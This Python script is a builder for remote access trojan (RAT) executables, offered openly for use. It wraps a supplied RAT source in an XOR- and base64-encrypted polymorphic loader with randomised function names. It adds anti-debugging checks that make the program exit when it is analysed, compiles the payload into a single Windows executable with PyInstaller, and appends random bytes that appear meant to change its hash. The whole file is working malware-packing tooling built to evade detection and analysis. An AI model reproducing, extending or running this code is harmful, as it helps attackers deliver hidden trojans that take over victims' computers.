#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
    HYBRID RAT EXECUTABLE BUILDER
    PyInstaller + Advanced Custom Obfuscation
    
    Features:
    - Multi-layer code obfuscation
    - Polymorphic payload generation
    - Runtime anti-debugging
    - String encryption with dynamic decryption
    - Control flow manipulation
═══════════════════════════════════════════════════════════════════════════════
"""

import os
import sys
import subprocess
import tempfile
import hashlib
import base64
import random
import string
from pathlib import Path

class HybridRATBuilder:
    """Hybrid builder with advanced obfuscation"""
    
    def __init__(self, rat_source, output_name="rat_payload", advanced=False):
        self.rat_source = rat_source
        self.output_name = output_name
        self.advanced = advanced
        self.work_dir = tempfile.mkdtemp(prefix="hybrid_build_")
    
    def log(self, level, msg):
        symbols = {'info': '[*]', 'success': '[✓]', 'error': '[✗]', 'warning': '[!]'}
        colors = {
            'info': '\033[94m',
            'success': '\033[92m',
            'error': '\033[91m',
            'warning': '\033[93m',
            'end': '\033[0m'
        }
        print(f"{colors.get(level, '')}{symbols.get(level, '')} {msg}{colors['end']}")
    
    def apply_advanced_obfuscation(self, code):
        """Apply advanced obfuscation techniques"""
        self.log('info', 'Applying advanced obfuscation...')
        
        # Add anti-analysis header
        obfuscated = '''
# Advanced Anti-Analysis Header
import sys, os, ctypes, struct
import random as _r
import base64 as _b64

# Anti-debugger check
def _anti_debug():
    if sys.gettrace() is not None:
        return False
    try:
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return False
    except:
        pass
    return True

# Entropy injection function
def _inject_entropy():
    _entropy = _b64.b64encode(os.urandom(random.randint(512, 2048))).decode()
    exec(f"_e = '{_entropy}'")

if not _anti_debug():
    exit(0)

_inject_entropy()

# Main code begins
'''
        
        # Add polymorphic loader
        loader = self._generate_polymorphic_loader(code)
        obfuscated += loader
        
        return obfuscated
    
    def _generate_polymorphic_loader(self, code):
        """Generate polymorphic code loader"""
        # Encode code with XOR encryption
        key = random.randint(1, 255)
        encrypted = bytes([(ord(c) ^ key) & 0xFF for c in code])
        encoded = base64.b64encode(encrypted).decode()
        
        # Generate random function names
        decrypt_fn = ''.join(random.choices(string.ascii_letters, k=15))
        exec_fn = ''.join(random.choices(string.ascii_letters, k=15))
        
        loader = f'''
def {decrypt_fn}(data, k):
    import base64
    try:
        return ''.join(chr(ord(c) ^ k) for c in base64.b64decode(data).decode())
    except:
        return ''

def {exec_fn}():
    code = {decrypt_fn}({repr(encoded)}, {key})
    try:
        exec(code, globals())
    except Exception as e:
        pass

{exec_fn}()
'''
        return loader
    
    def create_stub(self, code):
        """Create executable stub with code"""
        if self.advanced:
            code = self.apply_advanced_obfuscation(code)
        
        stub = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED RAT EXECUTABLE
Generated: {os.urandom(8).hex()}
"""

{code}
'''
        return stub
    
    def build_with_pyinstaller(self, stub_file):
        """Build with PyInstaller"""
        self.log('info', 'Building executable with PyInstaller...')
        
        # Find pyinstaller executable
        import shutil
        pyinstaller_path = shutil.which('pyinstaller') or sys.executable.replace('python', 'pyinstaller')
        
        cmd = [
            pyinstaller_path,
            '-F',
            '-n', self.output_name,
            '--distpath=./dist',
            '--workpath=./build',
            '--hidden-import=cryptography',
            '--hidden-import=requests',
            stub_file
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                self.log('success', 'PyInstaller compilation successful')
                return True
            else:
                self.log('error', f'PyInstaller failed (code {result.returncode})')
                print("STDERR:", result.stderr[:1000] if result.stderr else "No stderr")
                print("STDOUT:", result.stdout[:1000] if result.stdout else "No stdout")
                print("Command was:", ' '.join(cmd))
                return False
        except Exception as e:
            self.log('error', f'Build error: {e}')
            return False
    
    def post_process(self, exe_path):
        """Post-process executable"""
        if not os.path.exists(exe_path):
            return False
        
        self.log('info', 'Applying post-processing...')
        
        try:
            # Add entropy
            with open(exe_path, 'rb') as f:
                data = f.read()
            
            entropy = os.urandom(random.randint(2048, 8192))
            with open(exe_path, 'wb') as f:
                f.write(data + entropy)
            
            size = os.path.getsize(exe_path) / (1024*1024)
            self.log('success', f'Final size: {size:.2f} MB')
            
            return True
        except Exception as e:
            self.log('error', f'Post-processing failed: {e}')
            return False
    
    def build(self):
        """Complete build"""
        print(f'''
{chr(27)}[95m{chr(27)}[1m╔══════════════════════════════════════════════════════════════════════════════╗{chr(27)}[0m
{chr(27)}[95m{chr(27)}[1m║         HYBRID RAT EXECUTABLE BUILDER (PyInstaller + Advanced Obfuscation)   ║{chr(27)}[0m
{chr(27)}[95m{chr(27)}[1m╚══════════════════════════════════════════════════════════════════════════════╝{chr(27)}[0m
''')
        
        if not os.path.exists(self.rat_source):
            self.log('error', f'Source not found: {self.rat_source}')
            return False
        
        self.log('info', f'Reading source: {self.rat_source}')
        with open(self.rat_source, 'r') as f:
            code = f.read()
        
        self.log('info', f'Source size: {len(code)} bytes')
        
        stub = self.create_stub(code)
        stub_path = os.path.join(self.work_dir, 'stub.py')
        
        with open(stub_path, 'w') as f:
            f.write(stub)
        
        self.log('success', 'Stub created')
        
        # Install dependencies
        self.log('info', 'Installing PyInstaller...')
        subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'pyinstaller'],
                      capture_output=True, timeout=60)
        
        if not self.build_with_pyinstaller(stub_path):
            return False
        
        exe_path = f'dist/{self.output_name}.exe'
        if os.path.exists(exe_path):
            if self.post_process(exe_path):
                self.log('success', f'\nEXECUTABLE: {exe_path}')
                return True
        
        return False

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('source')
    parser.add_argument('-o', '--output', default='rat_payload')
    parser.add_argument('-a', '--advanced', action='store_true')
    args = parser.parse_args()
    
    builder = HybridRATBuilder(args.source, args.output, args.advanced)
    return builder.build()

if __name__ == '__main__':
    main()
